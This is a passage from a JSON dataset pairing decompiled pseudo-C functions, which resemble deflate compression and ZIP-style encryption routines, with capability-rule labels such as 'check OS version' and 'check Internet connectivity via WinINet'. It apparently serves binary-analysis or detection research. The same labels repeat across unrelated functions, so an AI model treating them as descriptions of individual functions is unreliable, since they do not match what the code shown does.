4) = iVar4 + -1;\n            }\n            iVar4 = *(var_58h + 4);\n            fcn.0042a403();\n            puVar3 = ~-(iVar4 != 0) & var_50h;\n            if (puVar3 != NULL) {\n                (***puVar3)(1);\n            }\n        }\n        var_18h = 0xf;\n        var_1ch = 0;\n        var_2ch = var_2ch & 0xffffff00;\n        var_4h = 1;\n        if (arg_1ch == '\\0') {\n            uVar2 = fcn.00422190(&var_48h);\n            var_4h._0_1_ = 3;\n            fcn.004063b0(uVar2);\n        }\n        else {\n            uVar2 = fcn.004221b0(&var_48h);\n            var_4h._0_1_ = 2;\n            fcn.004063b0(uVar2);\n        }\n        var_4h = CONCAT31(var_4h._1_3_, 1);\n        if (0xf < var_34h) {\n            fcn.0042ac49(var_48h);\n        }\n        uVar1 = *(arg_14h + 0x20);\n        if ((*(arg_14h + 0x24) < 0) || (((*(arg_14h + 0x24) < 1 && (uVar1 == 0)) || (uVar1 <= var_1ch)))) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = uVar1 - var_1ch;\n        }\n        if ((*(arg_14h + 0x14) & 0x1c0) != 0x40) {\n            puVar3 = fcn.00421e90(in_ECX, &var_68h, arg_ch, arg_10h, var_4ch, iVar4);\n            arg_ch = *puVar3;\n            arg_10h = puVar3[1];\n            iVar4 = 0;\n        }\n        puVar3 = var_2ch;\n        if (var_18h < 0x10) {\n            puVar3 = &var_2ch;\n        }\n        puVar3 = fcn.00421e20(in_ECX, &var_60h, arg_ch, arg_10h, puVar3, var_1ch);\n        uVar2 = *puVar3;\n        arg_14h_00 = puVar3[1];\n        *(arg_14h + 0x20) = 0;\n        *(arg_14h + 0x24) = 0;\n        fcn.00421e90(in_ECX, var_54h, uVar2, arg_14h_00, var_4ch, iVar4);\n        if (0xf < var_18h) {\n            fcn.0042ac49(var_2ch);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1263
    },
    "004243d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004243d0(uint *arg_8h, uint32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t arg_8h_00;\n    int32_t *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ee92;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_14h != 0) {\n        *in_ECX = 0x447ba0;\n        in_ECX[0x1a] = 0x447934;\n        var_4h = 0;\n    }\n    *(in_ECX + *(*in_ECX + 4)) = 0x44792c;\n    in_ECX[2] = 0;\n    in_ECX[3] = 0;\n    iVar3 = *(*in_ECX + 4);\n    fcn.00418b50(uVar2);\n    *(in_ECX + iVar3 + 0x38) = in_ECX + 4;\n    *(in_ECX + iVar3 + 0x3c) = 0;\n    uVar1 = fcn.00419b60(0x20);\n    *(in_ECX + iVar3 + 0x40) = uVar1;\n    if (*(in_ECX + iVar3 + 0x38) == 0) {\n        fcn.00418a20(*(in_ECX + iVar3 + 0xc) | 4, 0);\n    }\n    var_4h = 2;\n    *(in_ECX + *(*in_ECX + 4)) = 0x447b9c;\n    fcn.004194a0();\n    in_ECX[4] = 0x447a44;\n    *(in_ECX + 0x18) = 0;\n    *(in_ECX + 0x59) = 0;\n    in_ECX[8] = in_ECX + 6;\n    in_ECX[0xc] = in_ECX + 10;\n    in_ECX[0xd] = in_ECX + 0xb;\n    in_ECX[9] = in_ECX + 7;\n    in_ECX[0x10] = in_ECX + 0xe;\n    in_ECX[0x11] = in_ECX + 0xf;\n    in_ECX[7] = 0;\n    *in_ECX[0xd] = 0;\n    *in_ECX[0x11] = 0;\n    *in_ECX[8] = 0;\n    *in_ECX[0xc] = 0;\n    *in_ECX[0x10] = 0;\n    in_ECX[0x19] = 0;\n    in_ECX[0x17] = *0x468800;\n    in_ECX[0x15] = 0;\n    var_4h = CONCAT31(var_4h._1_3_, 3);\n    if (0xf < arg_8h[5]) {\n        arg_8h = *arg_8h;\n    }\n    iVar3 = fcn.00419d90(arg_8h, arg_ch | 1, arg_10h);\n    if (iVar3 == 0) {\n        uVar2 = *(*(*in_ECX + 4) + 0xc + in_ECX);\n        arg_8h_00 = uVar2 | 2;\n        if (*(in_ECX + *(*in_ECX + 4) + 0x38) == 0) {\n            arg_8h_00 = uVar2 | 6;\n        }\n        fcn.00418a20(arg_8h_00, 0);\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 942
    },
    "00425eb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425eb0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int16_t *piVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    uint16_t *puVar16;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar8 = arg_8h;\n    iVar10 = arg_ch[2];\n    iVar3 = arg_ch[3];\n    iVar4 = arg_ch[6];\n    iVar5 = arg_ch[1];\n    iVar14 = arg_ch[5];\n    iVar6 = *arg_ch;\n    *(arg_8h + 0xfe4) = 0;\n    *(arg_8h + 0xfe8) = 0;\n    *(arg_8h + 0xfec) = 0;\n    *(arg_8h + 0xff0) = 0;\n    *(arg_8h + 0xff4) = 0;\n    *(arg_8h + 0xff8) = 0;\n    *(arg_8h + 0xffc) = 0;\n    *(arg_8h + 0x1000) = 0;\n    *(iVar6 + 2 + *(arg_8h + 0x1004 + *(arg_8h + 0x18fc) * 4) * 4) = 0;\n    iVar12 = 0;\n    var_8h = *(arg_8h + 0x18fc) + 1;\n    var_4h = 0;\n    if (var_8h < 0x23d) {\n        arg_8h = arg_8h + 0x1004 + var_8h * 4;\n        var_10h = 0x23d - var_8h;\n        var_8h = var_8h + var_10h;\n        do {\n            iVar7 = *arg_8h;\n            iVar9 = *(iVar6 + 2 + *(iVar6 + 2 + iVar7 * 4) * 4) + 1;\n            if (iVar14 < iVar9) {\n                iVar12 = iVar12 + 1;\n                iVar9 = iVar14;\n                var_4h = iVar12;\n            }\n            *(iVar6 + 2 + iVar7 * 4) = iVar9;\n            if (iVar7 <= iVar4) {\n                piVar11 = iVar8 + 0xfe4 + iVar9 * 2;\n                *piVar11 = *piVar11 + 1;\n                iVar15 = 0;\n                if (iVar3 <= iVar7) {\n                    iVar15 = *(iVar10 + (iVar7 - iVar3) * 4);\n                }\n                uVar13 = *(iVar6 + iVar7 * 4);\n                *(iVar8 + 0x1af3c) = *(iVar8 + 0x1af3c) + (iVar9 + iVar15) * uVar13;\n                iVar12 = var_4h;\n                if (iVar5 != 0) {\n                    *(iVar8 + 0x1af40) = *(iVar8 + 0x1af40) + (*(iVar5 + 2 + iVar7 * 4) + iVar15) * uVar13;\n                }\n            }\n            arg_8h = arg_8h + 1;\n            var_10h = var_10h + -1;\n        } while (var_10h != 0);\n        if (iVar12 != 0) {\n            puVar16 = iVar8 + 0xfe4 + iVar14 * 2;\n            do {\n                iVar10 = iVar14 + -1;\n                piVar11 = iVar8 + 0xfe4 + iVar10 * 2;\n                iVar1 = *(iVar8 + 0xfe4 + iVar10 * 2);\n                while (iVar1 == 0) {\n                    piVar11 = piVar11 + -1;\n                    iVar10 = iVar10 + -1;\n                    iVar1 = *piVar11;\n                }\n                piVar11 = iVar8 + 0xfe6 + iVar10 * 2;\n                *piVar11 = *piVar11 + 2;\n                piVar11 = iVar8 + 0xfe4 + iVar10 * 2;\n                *piVar11 = *piVar11 + -1;\n                *puVar16 = *puVar16 - 1;\n                iVar12 = iVar12 + -2;\n            } while (0 < iVar12);\n            for (; iVar14 != 0; iVar14 = iVar14 + -1) {\n                arg_ch = *puVar16;\n                if (arg_ch != NULL) {\n                    iVar10 = iVar8 + 0x1004 + var_8h * 4;\n                    do {\n                        iVar3 = *(iVar10 + -4);\n                        var_8h = var_8h + -1;\n                        iVar10 = iVar10 + -4;\n                        if (iVar3 <= iVar4) {\n                            uVar2 = *(iVar6 + 2 + iVar3 * 4);\n                            if (uVar2 != iVar14) {\n                                *(iVar8 + 0x1af3c) = *(iVar8 + 0x1af3c) + (iVar14 - uVar2) * *(iVar6 + iVar3 * 4);\n                                *(iVar6 + 2 + iVar3 * 4) = iVar14;\n                            }\n                            arg_ch = arg_ch - 1;\n                        }\n                    } while (arg_ch != NULL);\n                }\n                puVar16 = puVar16 + -1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1367
    },
    "004264b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004264b0(uint *arg_8h)\n\n{\n    uint32_t *puVar1;\n    \n    if (arg_8h[0x6bd7] < 9) {\n        if (arg_8h[0x6bd7] < 1) goto code_r0x0042654b;\n        if (arg_8h[0x6bda] <= arg_8h[0x6bd9]) {\n            (*arg_8h[4])(*arg_8h, arg_8h[0x6bd8], arg_8h + 0x6bd9);\n        }\n        *(arg_8h[0x6bd8] + arg_8h[0x6bd9]) = *(arg_8h + 0x6bd6);\n    }\n    else {\n        puVar1 = arg_8h + 0x6bd9;\n        if (arg_8h[0x6bda] - 1 <= *puVar1) {\n            (*arg_8h[4])(*arg_8h, arg_8h[0x6bd8], puVar1);\n        }\n        *(arg_8h[0x6bd8] + *puVar1) = *(arg_8h + 0x6bd6);\n        *puVar1 = *puVar1 + 1;\n        *(*puVar1 + arg_8h[0x6bd8]) = *(arg_8h + 0x1af59);\n    }\n    arg_8h[0x6bd9] = arg_8h[0x6bd9] + 1;\ncode_r0x0042654b:\n    if (arg_8h[0x6bd5] != 0) {\n        (*arg_8h[4])(*arg_8h, arg_8h[0x6bd8], arg_8h + 0x6bd9);\n    }\n    arg_8h[0x6bd6] = 0;\n    arg_8h[0x6bd7] = 0;\n    arg_8h[0x6bdb] = arg_8h[0x6bdb] + 7 & 0xfffffff8;\n    return;\n}\n",
        "token_count": 504
    },
    "004265a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004265a0(uint *arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    \n    fcn.004264b0(arg_8h);\n    if (arg_14h != 0) {\n        puVar1 = arg_8h + 0x6bd9;\n        if (arg_8h[0x6bda] - 1 <= *puVar1) {\n            (*arg_8h[4])(*arg_8h, arg_8h[0x6bd8], puVar1);\n        }\n        *(arg_8h[0x6bd8] + *puVar1) = arg_10h;\n        *puVar1 = *puVar1 + 1;\n        uVar4 = arg_10h >> 8;\n        *(*puVar1 + arg_8h[0x6bd8]) = uVar4;\n        *puVar1 = *puVar1 + 1;\n        if (arg_8h[0x6bda] - 1 <= *puVar1) {\n            (*arg_8h[4])(*arg_8h, arg_8h[0x6bd8], puVar1);\n        }\n        *(arg_8h[0x6bd8] + *puVar1) = ~arg_10h;\n        *puVar1 = *puVar1 + 1;\n        *(*puVar1 + arg_8h[0x6bd8]) = ~uVar4;\n        *puVar1 = *puVar1 + 1;\n        arg_8h[0x6bdb] = arg_8h[0x6bdb] + 0x20;\n    }\n    if (arg_8h[0x6bd5] != 0) {\n        piVar2 = arg_8h + 0x6bd9;\n        (*arg_8h[4])(*arg_8h, arg_8h[0x6bd8], piVar2);\n        *piVar2 = arg_10h;\n        (*arg_8h[4])(*arg_8h, arg_ch, piVar2);\n        arg_8h[0x6bdb] = arg_8h[0x6bdb] + arg_10h * 8;\n        return;\n    }\n    uVar3 = arg_8h[0x6bd9] + arg_10h;\n    if (uVar3 < arg_8h[0x6bda] || uVar3 == arg_8h[0x6bda]) {\n        fcn.0042af40(arg_8h[0x6bd8] + arg_8h[0x6bd9], arg_ch, arg_10h);\n        arg_8h[0x6bd9] = arg_8h[0x6bd9] + arg_10h;\n    }\n    arg_8h[0x6bdb] = arg_8h[0x6bdb] + arg_10h * 8;\n    return;\n}\n",
        "token_count": 721
    },
    "00426830": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426830(int32_t arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    while( true ) {\n        iVar4 = (*(arg_8h + 0x6af70) - *(arg_8h + 0x6af84)) - *(arg_8h + 0x6af90);\n        if (iVar4 == -1) {\n            iVar4 = -2;\n        }\n        else if ((0xfef9 < *(arg_8h + 0x6af84)) && (*(arg_8h + 0x6af78) != 0)) {\n            fcn.0042af40(arg_8h + 0x1af70, arg_8h + 0x22f70, 0x8000);\n            *(arg_8h + 0x6af88) = *(arg_8h + 0x6af88) + -0x8000;\n            *(arg_8h + 0x6af84) = *(arg_8h + 0x6af84) + -0x8000;\n            *(arg_8h + 0x6af74) = *(arg_8h + 0x6af74) + -0x8000;\n            puVar1 = arg_8h + 0x4af70;\n            iVar3 = 0x8000;\n            do {\n                if (*puVar1 < 0x8000) {\n                    uVar2 = 0;\n                }\n                else {\n                    uVar2 = *puVar1 - 0x8000;\n                }\n                *puVar1 = uVar2;\n                puVar1 = puVar1 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n            puVar1 = arg_8h + 0x2af70;\n            iVar3 = 0x8000;\n            do {\n                if (*puVar1 < 0x8000) {\n                    uVar2 = 0;\n                }\n                else {\n                    uVar2 = *puVar1 - 0x8000;\n                }\n                *puVar1 = uVar2;\n                puVar1 = puVar1 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n            iVar4 = iVar4 + 0x8000;\n        }\n        if (*(arg_8h + 0x6af8c) != 0) break;\n        iVar4 = (**(arg_8h + 0xc))(arg_8h, *(arg_8h + 0x6af84) + arg_8h + 0x1af70 + *(arg_8h + 0x6af90), iVar4);\n        if ((iVar4 == 0) || (iVar4 == -1)) {\n            *(arg_8h + 0x6af8c) = 1;\n        }\n        else {\n            *(arg_8h + 0x6af90) = *(arg_8h + 0x6af90) + iVar4;\n        }\n        if (0x105 < *(arg_8h + 0x6af90)) {\n            return;\n        }\n        if (*(arg_8h + 0x6af8c) != 0) {\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 772
    },
    "00427870": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00427870(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint var_4h;\n    \n    uVar4 = arg_ch;\n    if (*(in_ECX + 0x2d) != '\\0') {\n        if ((*(in_ECX + 0x3c) != 0) && (*(in_ECX + 0x40) < arg_ch)) {\n            fcn.0042ac49(*(in_ECX + 0x3c));\n            *(in_ECX + 0x3c) = 0;\n        }\n        if (*(in_ECX + 0x3c) == 0) {\n            uVar2 = fcn.0042b9b1(uVar4 * 2);\n            *(in_ECX + 0x3c) = uVar2;\n            *(in_ECX + 0x40) = uVar4;\n        }\n        fcn.0042af40(*(in_ECX + 0x3c), arg_8h, uVar4);\n        uVar5 = 0;\n        if (uVar4 != 0) {\n            do {\n                uVar1 = *(uVar5 + *(in_ECX + 0x3c));\n                uVar4 = *(in_ECX + 0x38);\n                uVar3 = *(((uVar1 ^ *(in_ECX + 0x30)) & 0xff) * 4 + 0x4483b8) ^ *(in_ECX + 0x30) >> 8;\n                *(in_ECX + 0x30) = uVar3;\n                uVar3 = ((uVar3 & 0xff) + *(in_ECX + 0x34)) * 0x8088405 + 1;\n                *(in_ECX + 0x34) = uVar3;\n                *(in_ECX + 0x38) = uVar4 >> 8 ^ *(((uVar3 >> 0x18 ^ uVar4) & 0xff) * 4 + 0x4483b8);\n                uVar4 = uVar4 & 0xfffd | 2;\n                uVar3 = uVar5 + 1;\n                *(uVar5 + *(in_ECX + 0x3c)) = (uVar4 ^ 1) * uVar4 >> 8 ^ uVar1;\n                uVar5 = uVar3;\n                uVar4 = arg_ch;\n            } while (uVar3 < arg_ch);\n        }\n        arg_8h = *(in_ECX + 0x3c);\n    }\n    if (*(in_ECX + 0x20) == 0) {\n        if (*(in_ECX + 4) == 0) {\n            *(in_ECX + 0x14) = 0x1000000;\n            return 0;\n        }\n        (**0x469158)(*(in_ECX + 4), arg_8h, uVar4, &arg_ch, 0);\n        return arg_ch;\n    }\n    if (*(in_ECX + 0x24) + uVar4 < *(in_ECX + 0x28)) {\n        fcn.0042af40(*(in_ECX + 0x24) + *(in_ECX + 0x20), arg_8h, uVar4);\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + uVar4;\n        return uVar4;\n    }\n    *(in_ECX + 0x14) = 0x30000;\n    return 0;\n}\n",
        "token_count": 845
    },
    "004279d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004279d0(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x1c) == '\\0') {\n        *(in_ECX + 0x14) = 0x2000000;\n        return 0;\n    }\n    if (*(in_ECX + 0x20) != 0) {\n        if (*(in_ECX + 0x28) <= arg_8h) {\n            *(in_ECX + 0x14) = 0x30000;\n            return 0;\n        }\n        *(in_ECX + 0x24) = arg_8h;\n        return 1;\n    }\n    if (*(in_ECX + 4) != 0) {\n        (**0x469108)(*(in_ECX + 4), *(in_ECX + 0x10) + arg_8h, 0, 0);\n        return 1;\n    }\n    *(in_ECX + 0x14) = 0x1000000;\n    return 0;\n}\n",
        "token_count": 242
    },
    "00427ea0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00427ea0(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x80) != '\\0') && (*(param_1 + 0x7c) != 0)) {\n        (**0x4690f0)(*(param_1 + 0x7c));\n    }\n    *(param_1 + 0x7c) = 0;\n    if ((*(param_1 + 0x70) != -1) && (*(param_1 + 0x70) != *(param_1 + 0x74))) {\n        *(param_1 + 0x70) = *(param_1 + 0x74);\n        return 0x60000;\n    }\n    *(param_1 + 0x70) = *(param_1 + 0x74);\n    return 0;\n}\n",
        "token_count": 191
    },
    "00428060": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00428060(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t arg_ch_00;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = arg_ch[4];\n    iVar4 = arg_ch[1];\n    arg_ch_00 = *arg_ch;\n    iVar2 = 0;\n    var_4h = -1;\n    *(arg_8h + 0x18f8) = 0;\n    *(arg_8h + 0x18fc) = 0x23d;\n    if (0 < var_8h) {\n        do {\n            if (*(arg_ch_00 + iVar2 * 4) == 0) {\n                *(arg_ch_00 + 2 + iVar2 * 4) = 0;\n            }\n            else {\n                *(arg_8h + 0x18f8) = *(arg_8h + 0x18f8) + 1;\n                *(arg_8h + 0x1004 + *(arg_8h + 0x18f8) * 4) = iVar2;\n                *(iVar2 + 0x1900 + arg_8h) = 0;\n                var_4h = iVar2;\n            }\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < var_8h);\n    }\n    iVar2 = *(arg_8h + 0x18f8);\n    while (iVar2 < 2) {\n        if (var_4h < 2) {\n            iVar2 = var_4h + 1;\n            var_4h = iVar2;\n        }\n        else {\n            iVar2 = 0;\n        }\n        *(arg_8h + 0x18f8) = *(arg_8h + 0x18f8) + 1;\n        *(arg_8h + 0x1004 + *(arg_8h + 0x18f8) * 4) = iVar2;\n        *(arg_ch_00 + iVar2 * 4) = 1;\n        *(arg_8h + 0x1900 + iVar2) = 0;\n        *(arg_8h + 0x1af3c) = *(arg_8h + 0x1af3c) + -1;\n        if (iVar4 != 0) {\n            *(arg_8h + 0x1af40) = *(arg_8h + 0x1af40) - *(iVar4 + 2 + iVar2 * 4);\n        }\n        iVar2 = *(arg_8h + 0x18f8);\n    }\n    arg_ch[6] = var_4h;\n    for (iVar4 = *(arg_8h + 0x18f8) / 2; 0 < iVar4; iVar4 = iVar4 + -1) {\n        fcn.00425dd0(arg_8h, arg_ch_00, iVar4);\n    }\n    do {\n        iVar4 = *(arg_8h + 0x1008);\n        *(arg_8h + 0x1008) = *(arg_8h + 0x1004 + *(arg_8h + 0x18f8) * 4);\n        *(arg_8h + 0x18f8) = *(arg_8h + 0x18f8) + -1;\n        fcn.00425dd0(arg_8h, arg_ch_00, 1);\n        iVar2 = *(arg_8h + 0x1008);\n        *(arg_8h + 0x18fc) = *(arg_8h + 0x18fc) + -1;\n        *(arg_8h + 0x1004 + *(arg_8h + 0x18fc) * 4) = iVar4;\n        *(arg_8h + 0x18fc) = *(arg_8h + 0x18fc) + -1;\n        *(arg_8h + 0x1004 + *(arg_8h + 0x18fc) * 4) = iVar2;\n        *(arg_ch_00 + var_8h * 4) = *(arg_ch_00 + iVar2 * 4) + *(arg_ch_00 + iVar4 * 4);\n        uVar1 = *(arg_8h + 0x1900 + iVar2);\n        uVar3 = *(arg_8h + 0x1900 + iVar4);\n        if (uVar3 < uVar1) {\n            uVar3 = uVar1;\n        }\n        *(arg_8h + 0x1900 + var_8h) = uVar3 + 1;\n        *(arg_ch_00 + 2 + iVar2 * 4) = var_8h;\n        *(arg_ch_00 + 2 + iVar4 * 4) = var_8h;\n        *(arg_8h + 0x1008) = var_8h;\n        var_8h = var_8h + 1;\n        fcn.00425dd0(arg_8h, arg_ch_00, 1);\n    } while (1 < *(arg_8h + 0x18f8));\n    *(arg_8h + 0x18fc) = *(arg_8h + 0x18fc) + -1;\n    *(arg_8h + 0x1004 + *(arg_8h + 0x18fc) * 4) = *(arg_8h + 0x1008);\n    fcn.00425eb0(arg_8h, arg_ch);\n    fcn.00427fd0(arg_8h, arg_ch_00, var_4h);\n    return;\n}\n",
        "token_count": 1324
    },
    "00428690": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00428690(int32_t arg_8h, int32_t arg_ch, uint16_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    \n    *(arg_8h + 0x6af78) = 0;\n    if (*(arg_8h + 0x6af70) == 0) {\n        *(arg_8h + 0x6af78) = 1;\n        *(arg_8h + 0x6af70) = 0x10000;\n    }\n    *(arg_8h + 0x6af6c) = 0;\n    fcn.0042acb0(arg_8h + 0x4af70, 0, 0x1fffc);\n    *(arg_8h + 0x6af98) = *(arg_ch * 8 + 0x44836a);\n    *(arg_8h + 0x6af9c) = *(arg_ch * 8 + 0x448368);\n    *(arg_8h + 0x6afa0) = *(\"m-data; \" + arg_ch * 8);\n    *(arg_8h + 0x6af94) = *(\"m-data; \" + arg_ch * 8 + 2);\n    if (arg_ch < 3) {\n        *arg_10h = *arg_10h | 4;\n    }\n    else if (7 < arg_ch) {\n        *arg_10h = *arg_10h | 2;\n    }\n    *(arg_8h + 0x6af84) = 0;\n    *(arg_8h + 0x6af74) = 0;\n    uVar1 = (**(arg_8h + 0xc))(arg_8h, arg_8h + 0x1af70, 0x10000);\n    *(arg_8h + 0x6af90) = uVar1;\n    if ((uVar1 != 0) && (uVar1 != 0xffffffff)) {\n        *(arg_8h + 0x6af8c) = 0;\n        if (uVar1 < 0x106) {\n            fcn.00426830(arg_8h);\n        }\n        *(arg_8h + 0x6af7c) = 0;\n        uVar1 = *(arg_8h + 0x1af70);\n        *(arg_8h + 0x6af7c) = uVar1;\n        *(arg_8h + 0x6af7c) = *(arg_8h + 0x1af71) ^ uVar1 << 5;\n        return;\n    }\n    *(arg_8h + 0x6af90) = 0;\n    *(arg_8h + 0x6af8c) = 1;\n    return;\n}\n",
        "token_count": 645
    },
    "004288d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __fastcall fcn.004288d0(int32_t param_1)\n\n{\n    bool bVar1;\n    int32_t arg_8h;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar3 = *(param_1 + 0x18);\n    var_8h = 0;\n    bVar1 = true;\n    arg_8h = *(param_1 + 0x44);\n    while (arg_8h != 0) {\n        if ((bVar1) && (iVar2 = fcn.00426ce0(arg_8h, 0x427bf0, param_1),  iVar2 != 0)) {\n            bVar1 = false;\n        }\n        var_8h = var_8h + 1;\n        *(param_1 + 0x18) = *(param_1 + 0x18) + *(arg_8h + 0x24) + *(arg_8h + 0x20) + 0x2e + *(arg_8h + 0x18);\n        iVar2 = *(arg_8h + 0x35c);\n        if (*(arg_8h + 0x140) != 0) {\n            fcn.0042ac49(*(arg_8h + 0x140));\n        }\n        fcn.0042ac49(arg_8h);\n        arg_8h = iVar2;\n    }\n    if (bVar1) {\n        iVar3 = fcn.00427040(var_8h, *(param_1 + 0x18) - iVar3, *(param_1 + 0x10) + iVar3, 0, 0, 0x427bf0, param_1);\n        if (iVar3 != 0) {\n            bVar1 = false;\n        }\n        *(param_1 + 0x18) = *(param_1 + 0x18) + 0x16;\n        if (bVar1) {\n            return 0;\n        }\n    }\n    return 0x400;\n}\n",
        "token_count": 493
    },
    "00428dc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00428dc0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *(*(arg_8h + 0x1af34) + 0x19f2c + arg_8h) = *(arg_8h + 0x1af38);\n    if (**(arg_8h + 0x1af50) == -1) {\n        fcn.00426360(arg_8h);\n    }\n    fcn.00428060(arg_8h, arg_8h + 0xf90);\n    fcn.00428060(arg_8h, arg_8h + 0xfac);\n    iVar1 = fcn.004283c0(arg_8h);\n    *(arg_8h + 0x1af4c) = *(arg_8h + 0x1af4c) + arg_10h;\n    uVar2 = *(arg_8h + 0x1af3c) + 10U >> 3;\n    uVar3 = *(arg_8h + 0x1af40) + 10U >> 3;\n    if (uVar3 <= uVar2) {\n        uVar2 = uVar3;\n    }\n    if ((uVar2 < arg_10h + 4U) || (arg_ch == 0)) {\n        if (uVar3 == uVar2) {\n            fcn.00426410(arg_8h, arg_14h + 2, 3);\n            fcn.00428540(arg_8h, 